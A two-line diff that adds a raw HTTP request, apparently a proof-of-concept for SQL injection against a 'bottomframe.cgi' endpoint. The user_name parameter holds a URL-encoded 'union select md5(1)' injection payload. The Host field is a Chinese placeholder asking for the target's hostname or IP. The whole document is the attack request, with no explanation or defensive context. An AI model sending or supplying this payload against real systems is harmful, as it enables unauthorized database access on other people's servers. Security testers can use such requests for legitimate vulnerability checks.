@@ -1,0 +1,2 @@
+GET /bottomframe.cgi?user_name=%27))%20union%20select%20md5(1)%23 HTTP/1.1
+Host: [你的主机名或IP地址]
